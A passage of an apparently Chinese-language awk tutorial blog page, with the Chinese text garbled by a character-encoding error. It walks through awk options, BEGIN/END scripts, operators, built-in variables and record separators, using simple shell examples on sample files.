<p>-f scripfile or --file scriptfile<br>
ä»è„šæœ¬æ–‡ä»¶ä¸­è¯»å–awkå‘½ä»¤ã€‚</p>
</li>
</ul>
<h4 id="åŸºæœ¬ç”¨æ³•">åŸºæœ¬ç”¨æ³•</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;[pattern] action&#125;&#x27;</span> file</span><br></pre></td></tr></table></figure>
<p>æ¯è¡ŒæŒ‰ç©ºæ ¼æˆ–TABåˆ†å‰²ï¼Œä½¿ç”¨<code>print</code>è¾“å‡ºæ–‡æœ¬ä¸­çš„1ã€4åˆ—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> <span class="built_in">log</span></span><br><span class="line">2 this is a <span class="built_in">test</span></span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br><span class="line"><span class="string">[root@rocky8:~]# awk &#x27;</span>&#123;<span class="built_in">print</span> <span class="variable">$1</span>,<span class="variable">$4</span>&#125;<span class="string">&#x27; log</span></span><br><span class="line"><span class="string">2 a</span></span><br><span class="line"><span class="string">3 like</span></span><br><span class="line"><span class="string">This&#x27;</span>s </span><br><span class="line">10 orange,apple,mongo</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨<code>printf</code>æ ¼å¼åŒ–è¾“å‡ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;printf &quot;%-8s %-10s\n&quot;,$1,$4&#125;&#x27;</span> <span class="built_in">log</span></span><br><span class="line">2        a         </span><br><span class="line">3        like      </span><br><span class="line">This<span class="string">&#x27;s             </span></span><br><span class="line"><span class="string">10       orange,apple,mongo</span></span><br></pre></td></tr></table></figure>
<h5 id="FæŒ‡å®šåˆ†å‰²å­—ç¬¦"><code>-F</code>æŒ‡å®šåˆ†å‰²å­—ç¬¦</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F  <span class="comment">#-Fç›¸å½“äºå†…ç½®å˜é‡FS, æŒ‡å®šåˆ†å‰²å­—</span></span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨:åˆ†å‰²,å–/etc/passwdæ–‡ä»¶æ¯ä¸ªç”¨æˆ·å¯¹åº”shellï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk -F: <span class="string">&#x27;&#123;print $1,$7&#125;&#x27;</span> /etc/passwd</span><br><span class="line">root /bin/bash</span><br><span class="line">daemon /sbin/nologin</span><br><span class="line">bin /sbin/nologin</span><br><span class="line">adm /sbin/nologin</span><br><span class="line">lp /sbin/nologin</span><br><span class="line"><span class="built_in">sync</span> /bin/sync</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶ä½¿ç”¨:å’Œ/lä¸¤ä¸ªåˆ†éš”ç¬¦åˆ†å‰²/etc/passwdæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk -F <span class="string">&#x27;[:\/]&#x27;</span> <span class="string">&#x27;&#123;print $1,$7&#125;&#x27;</span>  /etc/passwd</span><br><span class="line">awk: warning: escape sequence `\/<span class="string">&#x27; treated as plain `/&#x27;</span></span><br><span class="line">root root</span><br><span class="line">daemon sbin</span><br><span class="line">bin bin</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h5 id="vè®¾ç½®å˜é‡"><code>-v</code>è®¾ç½®å˜é‡</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -v  <span class="comment"># è®¾ç½®å˜é‡</span></span><br></pre></td></tr></table></figure>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> <span class="built_in">log</span></span><br><span class="line">2 this is a <span class="built_in">test</span></span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br><span class="line"><span class="string">[root@rocky8:~]# awk -va=1 &#x27;</span>&#123;<span class="built_in">print</span> <span class="variable">$1</span>,<span class="variable">$1</span>+a&#125;<span class="string">&#x27; log</span></span><br><span class="line"><span class="string">2 3</span></span><br><span class="line"><span class="string">3 4</span></span><br><span class="line"><span class="string">This&#x27;</span>s 1</span><br><span class="line">10 11</span><br><span class="line">[root@rocky8:~]# awk -va=1 -vb=s <span class="string">&#x27;&#123;print $1,$1+a,$1b&#125;&#x27;</span> <span class="built_in">log</span></span><br><span class="line">2 3 2s</span><br><span class="line">3 4 3s</span><br><span class="line">This<span class="string">&#x27;s 1 This&#x27;</span>ss</span><br><span class="line">10 11 10s</span><br></pre></td></tr></table></figure>
<h5 id="fæŒ‡å®šawkè„šæœ¬"><code>-f</code>æŒ‡å®šawkè„šæœ¬</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -f &#123;awkè„šæœ¬&#125; &#123;æ–‡ä»¶å&#125;</span><br></pre></td></tr></table></figure>
<p>è„šæœ¬æ¨¡å—ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>BEGIN{ è¿™é‡Œé¢æ”¾çš„æ˜¯æ‰§è¡Œå‰çš„è¯­å¥ }</p>
</li>
<li class="lvl-2">
<p>END {è¿™é‡Œé¢æ”¾çš„æ˜¯å¤„ç†å®Œæ‰€æœ‰çš„è¡Œåè¦æ‰§è¡Œçš„è¯­å¥ }</p>
</li>
<li class="lvl-2">
<p>{è¿™é‡Œé¢æ”¾çš„æ˜¯å¤„ç†æ¯ä¸€è¡Œæ—¶è¦æ‰§è¡Œçš„è¯­å¥}</p>
</li>
</ul>
<p>å‡è®¾æœ‰è¿™ä¹ˆä¸€ä¸ªæ–‡ä»¶ï¼ˆå­¦ç”Ÿæˆç»©è¡¨ï¼‰ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> score</span><br><span class="line">Marry   2143 78 84 77</span><br><span class="line">Jack    2321 66 78 45</span><br><span class="line">Tom     2122 48 77 71</span><br><span class="line">Mike    2537 87 97 95</span><br><span class="line">Bob     2415 40 57 62</span><br></pre></td></tr></table></figure>
<p>awkè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> cal.awk</span><br><span class="line"><span class="comment">#!/bin/awk -f</span></span><br><span class="line"><span class="comment">#è¿è¡Œå‰</span></span><br><span class="line">BEGIN &#123;</span><br><span class="line">    math = 0</span><br><span class="line">    english = 0</span><br><span class="line">    computer = 0</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;---------------------------------------------\n&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#è¿è¡Œä¸­</span></span><br><span class="line">&#123;</span><br><span class="line">    math+=<span class="variable">$3</span></span><br><span class="line">    english+=<span class="variable">$4</span></span><br><span class="line">    computer+=<span class="variable">$5</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;%-6s %-6s %4d %8d %8d %8d\n&quot;</span>, <span class="variable">$1</span>,<span class="variable">$2</span>,<span class="variable">$3</span>,<span class="variable">$4</span>,<span class="variable">$5</span>,<span class="variable">$3</span>+<span class="variable">$4</span>+<span class="variable">$5</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#è¿è¡Œå</span></span><br><span class="line">END &#123;</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;---------------------------------------------\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;  TOTAL:%10d %8d %8d \n&quot;</span>, math, english, computer</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;AVERAGE:%10.2f %8.2f %8.2f\n&quot;</span>, math/NR, english/NR, computer/NR</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><font class="notice">æ³¨ï¼šEND{}ä¸­çš„NRè¡¨ç¤ºå·²ç»è¯»å‡ºçš„è®°å½•æ•°ï¼Œå°±æ˜¯è¡Œå·ï¼Œä»1å¼€å§‹</font></p>
<p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æ‰§è¡Œç»“æœï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk -f cal.awk score</span><br><span class="line">NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL</span><br><span class="line">---------------------------------------------</span><br><span class="line">Marry  2143     78       84       77      239</span><br><span class="line">Jack   2321     66       78       45      189</span><br><span class="line">Tom    2122     48       77       71      196</span><br><span class="line">Mike   2537     87       97       95      279</span><br><span class="line">Bob    2415     40       57       62      159</span><br><span class="line">---------------------------------------------</span><br><span class="line">  TOTAL:       319      393      350 </span><br><span class="line">AVERAGE:     63.80    78.60    70.00</span><br></pre></td></tr></table></figure>
<h4 id="AWKå·¥ä½œåŸç†">AWKå·¥ä½œåŸç†</h4>
<p>AWK å·¥ä½œæµç¨‹å¯åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>è¯»è¾“å…¥æ–‡ä»¶ä¹‹å‰æ‰§è¡Œçš„ä»£ç æ®µï¼ˆç”±BEGINå…³é”®å­—æ ‡è¯†ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p>ä¸»å¾ªç¯æ‰§è¡Œè¾“å…¥æ–‡ä»¶çš„ä»£ç æ®µã€‚</p>
</li>
<li class="lvl-2">
<p>è¯»è¾“å…¥æ–‡ä»¶ä¹‹åçš„ä»£ç æ®µï¼ˆç”±ENDå…³é”®å­—æ ‡è¯†ï¼‰ã€‚</p>
</li>
</ul>
<p>å‘½ä»¤ç»“æ„:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123; commands &#125; pattern&#123; commands &#125; END&#123; commands &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢çš„æµç¨‹å›¾æè¿°å‡ºäº† AWK çš„å·¥ä½œæµç¨‹ï¼š</p>
<p><img src="/posts/247a4e5f//d45d394db034998c8059e647e321a13d.png" alt="img"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>1ã€é€šè¿‡å…³é”®å­— BEGIN æ‰§è¡Œ BEGIN å—çš„å†…å®¹ï¼Œå³ BEGIN åèŠ±æ‹¬å· <strong>{}</strong> çš„å†…å®¹ã€‚</p>
</li>
<li class="lvl-2">
<p>2ã€å®Œæˆ BEGIN å—çš„æ‰§è¡Œï¼Œå¼€å§‹æ‰§è¡Œbodyå—ã€‚</p>
</li>
<li class="lvl-2">
<p>3ã€è¯»å…¥æœ‰ <strong>\n</strong> æ¢è¡Œç¬¦åˆ†å‰²çš„è®°å½•ã€‚</p>
</li>
<li class="lvl-2">
<p>4ã€å°†è®°å½•æŒ‰æŒ‡å®šçš„åŸŸåˆ†éš”ç¬¦åˆ’åˆ†åŸŸï¼Œå¡«å……åŸŸï¼Œ<strong>$0</strong> åˆ™è¡¨ç¤ºæ‰€æœ‰åŸŸ(å³ä¸€è¡Œå†…å®¹)ï¼Œ**1è¡¨ç¤ºç¬¬ä¸€ä¸ªåŸŸï¼Œâˆ—âˆ—nè¡¨ç¤ºç¬¬ n ä¸ªåŸŸã€‚</p>
</li>
<li class="lvl-2">
<p>5ã€ä¾æ¬¡æ‰§è¡Œå„ BODY å—ï¼Œpattern éƒ¨åˆ†åŒ¹é…è¯¥è¡Œå†…å®¹æˆåŠŸåï¼Œæ‰ä¼šæ‰§è¡Œ awk-commands çš„å†…å®¹ã€‚</p>
</li>
<li class="lvl-2">
<p>6ã€å¾ªç¯è¯»å–å¹¶æ‰§è¡Œå„è¡Œç›´åˆ°æ–‡ä»¶ç»“æŸï¼Œå®Œæˆbodyå—æ‰§è¡Œã€‚</p>
</li>
<li class="lvl-2">
<p>7ã€å¼€å§‹ END å—æ‰§è¡Œï¼ŒEND å—å¯ä»¥è¾“å‡ºæœ€ç»ˆç»“æœã€‚</p>
</li>
</ul>
<h5 id="è¿ç®—ç¬¦">è¿ç®—ç¬¦</h5>
<table>
<thead>
<tr>
<th>è¿ç®—ç¬¦</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>= += -= *= /= %= ^= **=</td>
<td>èµ‹å€¼</td>
</tr>
<tr>
<td>?:</td>
<td>Cæ¡ä»¶è¡¨è¾¾å¼</td>
</tr>
<tr>
<td>||</td>
<td>é€»è¾‘æˆ–</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>é€»è¾‘ä¸</td>
</tr>
<tr>
<td>~ å’Œ !~</td>
<td>åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼å’Œä¸åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼</td>
</tr>
<tr>
<td>&lt; &lt;= &gt; &gt;= != ==</td>
<td>å…³ç³»è¿ç®—ç¬¦</td>
</tr>
<tr>
<td>ç©ºæ ¼</td>
<td>è¿æ¥</td>
</tr>
<tr>
<td>+ -</td>
<td>åŠ ï¼Œå‡</td>
</tr>
<tr>
<td>* / %</td>
<td>ä¹˜ï¼Œé™¤ä¸æ±‚ä½™</td>
</tr>
<tr>
<td>+ - !</td>
<td>ä¸€å…ƒåŠ ï¼Œå‡å’Œé€»è¾‘é</td>
</tr>
<tr>
<td>^ ***</td>
<td>æ±‚å¹‚</td>
</tr>
<tr>
<td>++ â€“</td>
<td>å¢åŠ æˆ–å‡å°‘ï¼Œä½œä¸ºå‰ç¼€æˆ–åç¼€</td>
</tr>
<tr>
<td>$</td>
<td>å­—æ®µå¼•ç”¨</td>
</tr>
<tr>
<td>in</td>
<td>æ•°ç»„æˆå‘˜</td>
</tr>
</tbody>
</table>
<p><strong>è¿‡æ»¤ç¬¬ä¸€åˆ—å¤§äº2çš„è¡Œ</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$1&gt;2&#x27;</span> <span class="built_in">log</span></span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br></pre></td></tr></table></figure>
<p><strong>è¿‡æ»¤ç¬¬ä¸€åˆ—ç­‰äº2çš„è¡Œ</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$1==2 &#123;print $1,$3&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">2 is</span><br></pre></td></tr></table></figure>
<p><strong>è¿‡æ»¤ç¬¬ä¸€åˆ—å¤§äº2å¹¶ä¸”ç¬¬äºŒåˆ—ç­‰äºâ€™Areâ€™çš„è¡Œ</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$1&gt;2 &amp;&amp; $2==&quot;Are&quot; &#123;print $1,$2,$3&#125;&#x27;</span> <span class="built_in">log</span></span><br><span class="line">3 Are you</span><br></pre></td></tr></table></figure>
<p><strong>å†…å»ºå˜é‡</strong></p>
<table>
<thead>
<tr>
<th>å˜é‡</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>$n</td>
<td>å½“å‰è®°å½•çš„ç¬¬nä¸ªå­—æ®µï¼Œå­—æ®µé—´ç”±FSåˆ†éš”</td>
</tr>
<tr>
<td>$0</td>
<td>å®Œæ•´çš„è¾“å…¥è®°å½•</td>
</tr>
<tr>
<td>ARGC</td>
<td>å‘½ä»¤è¡Œå‚æ•°çš„æ•°ç›®</td>
</tr>
<tr>
<td>ARGIND</td>
<td>å‘½ä»¤è¡Œä¸­å½“å‰æ–‡ä»¶çš„ä½ç½®(ä»0å¼€å§‹ç®—)</td>
</tr>
<tr>
<td>ARGV</td>
<td>åŒ…å«å‘½ä»¤è¡Œå‚æ•°çš„æ•°ç»„</td>
</tr>
<tr>
<td>CONVFMT</td>
<td>æ•°å­—è½¬æ¢æ ¼å¼(é»˜è®¤å€¼ä¸º%.6g)ENVIRONç¯å¢ƒå˜é‡å…³è”æ•°ç»„</td>
</tr>
<tr>
<td>ERRNO</td>
<td>æœ€åä¸€ä¸ªç³»ç»Ÿé”™è¯¯çš„æè¿°</td>
</tr>
<tr>
<td>FIELDWIDTHS</td>
<td>å­—æ®µå®½åº¦åˆ—è¡¨(ç”¨ç©ºæ ¼é”®åˆ†éš”)</td>
</tr>
<tr>
<td>FILENAME</td>
<td>å½“å‰æ–‡ä»¶å</td>
</tr>
<tr>
<td>FNR</td>
<td>å„æ–‡ä»¶åˆ†åˆ«è®¡æ•°çš„è¡Œå·</td>
</tr>
<tr>
<td>FS</td>
<td>å­—æ®µåˆ†éš”ç¬¦(é»˜è®¤æ˜¯ä»»ä½•ç©ºæ ¼)</td>
</tr>
<tr>
<td>IGNORECASE</td>
<td>å¦‚æœä¸ºçœŸï¼Œåˆ™è¿›è¡Œå¿½ç•¥å¤§å°å†™çš„åŒ¹é…</td>
</tr>
<tr>
<td>NF</td>
<td>ä¸€æ¡è®°å½•çš„å­—æ®µçš„æ•°ç›®</td>
</tr>
<tr>
<td>NR</td>
<td>å·²ç»è¯»å‡ºçš„è®°å½•æ•°ï¼Œå°±æ˜¯è¡Œå·ï¼Œä»1å¼€å§‹</td>
</tr>
<tr>
<td>OFMT</td>
<td>æ•°å­—çš„è¾“å‡ºæ ¼å¼(é»˜è®¤å€¼æ˜¯%.6g)</td>
</tr>
<tr>
<td>OFS</td>
<td>è¾“å‡ºè®°å½•åˆ†éš”ç¬¦ï¼ˆè¾“å‡ºæ¢è¡Œç¬¦ï¼‰ï¼Œè¾“å‡ºæ—¶ç”¨æŒ‡å®šçš„ç¬¦å·ä»£æ›¿æ¢è¡Œç¬¦</td>
</tr>
<tr>
<td>ORS</td>
<td>è¾“å‡ºè®°å½•åˆ†éš”ç¬¦(é»˜è®¤å€¼æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦)</td>
</tr>
<tr>
<td>RLENGTH</td>
<td>ç”±matchå‡½æ•°æ‰€åŒ¹é…çš„å­—ç¬¦ä¸²çš„é•¿åº¦</td>
</tr>
<tr>
<td>RS</td>
<td>è®°å½•åˆ†éš”ç¬¦(é»˜è®¤æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦)</td>
</tr>
<tr>
<td>RSTART</td>
<td>ç”±matchå‡½æ•°æ‰€åŒ¹é…çš„å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªä½ç½®</td>
</tr>
<tr>
<td>SUBSEP</td>
<td>æ•°ç»„ä¸‹æ ‡åˆ†éš”ç¬¦(é»˜è®¤å€¼æ˜¯/034)</td>
</tr>
</tbody>
</table>
<p>æ ¼å¼åŒ–å˜é‡è¯´æ˜ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>%s è¾“å‡ºå­—ç¬¦ä¸²</p>
</li>
<li class="lvl-2">
<p>%i è¾“å‡ºæ•´æ•°</p>
</li>
<li class="lvl-2">
<p>%f è¾“å‡ºæµ®ç‚¹æ•°</p>
</li>
</ul>
<p>%-5s æ ¼å¼ä¸ºå·¦å¯¹é½ä¸”å®½åº¦ä¸º5çš„å­—ç¬¦ä¸²ä»£æ›¿ï¼ˆ-è¡¨ç¤ºå·¦å¯¹é½ï¼‰ï¼Œä¸ä½¿ç”¨åˆ™æ˜¯åˆå¯¹é½ã€‚<br>
%-4.2f æ ¼å¼ä¸ºå·¦å¯¹é½å®½åº¦ä¸º4ï¼Œä¿ç•™ä¸¤ä½å°æ•°ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;printf &quot;%8s %8s %8s %8s %8s %8s %8s\n&quot;,&quot;FILENAME&quot;,&quot;ARGC&quot;,&quot;FNR&quot;,&quot;FS&quot;,&quot;NF&quot;,&quot;NR&quot;,&quot;OFS&quot;;printf &quot;---------------------------------------------\n&quot;&#125; &#123;printf &quot;%8s %8s %8s %8s %8s %8s %8s\n&quot;,FILENAME,ARGC,FNR,FS,NF,NR,OFS&#125;&#x27;</span>  <span class="built_in">log</span></span><br><span class="line">FILENAME     ARGC      FNR       FS       NF       NR      OFS</span><br><span class="line">---------------------------------------------</span><br><span class="line">     <span class="built_in">log</span>        2        1                 5        1         </span><br><span class="line">     <span class="built_in">log</span>        2        2                 5        2         </span><br><span class="line">     <span class="built_in">log</span>        2        3                 3        3         </span><br><span class="line">     <span class="built_in">log</span>        2        4                 4        4          </span><br><span class="line"></span><br><span class="line">[root@rocky8:~]# awk -F: <span class="string">&#x27;BEGIN&#123;printf &quot;%4s %4s %4s %4s %4s %4s %4s %4s %4s\n&quot;,&quot;FILENAME&quot;,&quot;ARGC&quot;,&quot;FNR&quot;,&quot;FS&quot;,&quot;NF&quot;,&quot;NR&quot;,&quot;OFS&quot;,&quot;ORS&quot;,&quot;RS&quot;;printf &quot;---------------------------------------------\n&quot;&#125; &#123;printf &quot;%4s %4s %4s %4s %4s %4s %4s %4s %4s\n&quot;,FILENAME,ARGC,FNR,FS,NF,NR,OFS,ORS,RS&#125;&#x27;</span>  <span class="built_in">log</span></span><br><span class="line">FILENAME ARGC  FNR   FS   NF   NR  OFS  ORS   RS</span><br><span class="line">---------------------------------------------</span><br><span class="line"> <span class="built_in">log</span>    2    1    :    1    1         </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"> <span class="built_in">log</span>    2    2    :    1    2         </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"> <span class="built_in">log</span>    2    3    :    1    3         </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"> <span class="built_in">log</span>    2    4    :    1    4         </span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="è¾“å‡ºé¡ºåºå·-NR-åŒ¹é…æ–‡æœ¬è¡Œå·">è¾“å‡ºé¡ºåºå· NR, åŒ¹é…æ–‡æœ¬è¡Œå·</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;print NR,FNR,$1,$2,$3&#125;&#x27;</span> <span class="built_in">log</span></span><br><span class="line">1 1 2 this is</span><br><span class="line">2 2 3 Are you</span><br><span class="line">3 3 This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">4 4 10 There are</span></span><br></pre></td></tr></table></figure>
<h5 id="æŒ‡å®šè¾“å‡ºåˆ†å‰²ç¬¦">æŒ‡å®šè¾“å‡ºåˆ†å‰²ç¬¦</h5>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@ubuntu</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat log.txt </span><br><span class="line"><span class="number">2</span> this is a test</span><br><span class="line"><span class="number">3</span> <span class="title class_">Are</span> you like awk</span><br><span class="line"><span class="title class_">This</span><span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br><span class="line"><span class="string">python@ubuntu:~/test$ awk &#x27;</span>&#123;print <span class="variable">$1</span>,<span class="variable">$2</span>,<span class="variable">$5</span>&#125;<span class="string">&#x27; OFS=&quot; $ &quot;  log.txt</span></span><br><span class="line"><span class="string">2 $ this $ test</span></span><br><span class="line"><span class="string">3 $ Are $ awk</span></span><br><span class="line"><span class="string">This&#x27;</span>s <span class="variable">$ </span>a <span class="variable">$ </span></span><br><span class="line"><span class="number">10</span> <span class="variable">$ </span><span class="title class_">There</span> <span class="variable">$ </span></span><br><span class="line"><span class="number">12345678910</span></span><br></pre></td></tr></table></figure>
<h5 id="å¿½ç•¥å¤§å°å†™">å¿½ç•¥å¤§å°å†™</h5>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="section">$ awk &#x27;BEGIN&#123;IGNORECASE=1&#125; /this/&#x27; log.txt</span></span><br><span class="line"><span class="section">---------------------------------------------</span></span><br><span class="line">2 this is a test</span><br><span class="line">This&#x27;s a test</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<h4 id="RS-ORS-FS-OFSåŒºåˆ«ä¸è”ç³»">RS,ORS,FS,OFSåŒºåˆ«ä¸è”ç³»</h4>
<p>å­¦ä¹ awkæ—¶ï¼Œä¸€å®šè¦è®°å¾—åŠ¨æ‰‹å»å®è·µï¼Œåªæœ‰åœ¨å®è·µä¸­æ‰èƒ½å‘ç°é—®é¢˜ï¼Œä»¥ä¸‹å°±æˆ‘åœ¨å­¦ä¹ ä¸­å’Œå®è·µä¸­çš„ç»éªŒï¼Œæ€»ç»“ä¸€ä¸‹RS,ORS,FS,OFSçš„åŒºåˆ«å’Œè”ç³»ã€‚</p>
<p><strong>ä¸€ï¼ŒRSä¸ORS</strong></p>
<p>1ï¼ŒRSæ˜¯è®°å½•<a href="https://so.csdn.net/so/search?q=%E5%88%86%E9%9A%94%E7%AC%A6&amp;spm=1001.2101.3001.7020">åˆ†éš”ç¬¦</a>ï¼Œé»˜è®¤çš„åˆ†éš”ç¬¦æ˜¯\nï¼Œå…·ä½“ç”¨æ³•çœ‹ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> test1</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br></pre></td></tr></table></figure>
<p>2ï¼ŒRSé»˜è®¤åˆ†å‰²ç¬¦\n</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span> test1  //awk <span class="string">&#x27;BEGIN&#123;RS=&quot;\n&quot;&#125;&#123;print $0&#125;&#x27;</span> test1 è¿™äºŒä¸ªæ˜¯ä¸€æ ·çš„</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br></pre></td></tr></table></figure>
<p>å…¶å®ä½ å¯ä»¥æŠŠ<strong>ä¸Šé¢test1æ–‡ä»¶é‡Œçš„å†…å®¹ç†è§£ä¸ºï¼Œ111 222\n333 444\n555 6666ï¼Œåˆ©ç”¨\nè¿›è¡Œåˆ†å‰²</strong>ã€‚çœ‹ä¸‹ä¸€ä¸ªä¾‹å­</p>
<p>3ï¼Œè‡ªå®šä¹‰RSåˆ†å‰²ç¬¦</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111 222|333 444|555 666&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;RS=&quot;|&quot;&#125;&#123;print $0,RT&#125;&#x27;</span></span><br><span class="line">111 222 |</span><br><span class="line">333 444 |</span><br><span class="line">555 666</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç»“åˆä¸Šé¢ä¸€ä¸ªä¾‹å­ï¼Œå°±å¾ˆå®¹æ˜“ç†è§£RSçš„ç”¨æ³•äº†ã€‚</p>
<p>4ï¼ŒRSä¹Ÿå¯èƒ½æ˜¯æ­£åˆ™è¡¨è¾¾å¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111 222a333 444b555 666&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;RS=&quot;[a-z]+&quot;&#125;&#123;print $1,RS,RT&#125;&#x27;</span></span><br><span class="line">111 [a-z]+ a</span><br><span class="line">333 [a-z]+ b</span><br><span class="line">555 [a-z]+</span><br></pre></td></tr></table></figure>
<p>ä»ä¾‹3å’Œä¾‹4ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸€ç‚¹ï¼Œ<strong>å½“RTæ˜¯åˆ©ç”¨RSåŒ¹é…å‡ºæ¥çš„å†…å®¹ã€‚å¦‚æœRSæ˜¯æŸä¸ªå›ºå®šçš„å€¼æ—¶ï¼ŒRTå°±æ˜¯RSçš„å†…å®¹</strong>ã€‚</p>
<p>5ï¼ŒRSä¸ºç©ºæ—¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> -n test2</span><br><span class="line">     1	111 222</span><br><span class="line">     2	</span><br><span class="line">     3	333 444</span><br><span class="line">     4	333 444</span><br><span class="line">     5	</span><br><span class="line">     6	</span><br><span class="line">     7	555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;RS=&quot;&quot;&#125;&#123;print $0&#125;&#x27;</span> test2</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;RS=&quot;&quot;&#125;&#123;print &quot;&lt;&quot;,$0,&quot;&gt;&quot;&#125;&#x27;</span> test2</span><br><span class="line">&lt; 111 222 &gt;</span><br><span class="line">&lt; 333 444       //è¿™ä¸€è¡Œå’Œä¸‹é¢ä¸€è¡Œï¼Œæ˜¯ä¸€è¡Œ </span><br><span class="line">333 444 &gt;</span><br><span class="line">&lt; 555 666 &gt;</span><br></pre></td></tr></table></figure>
<p>6ï¼ŒORSè®°å½•è¾“å‡ºåˆ†ç¬¦ç¬¦ï¼Œé»˜è®¤å€¼æ˜¯\n</p>
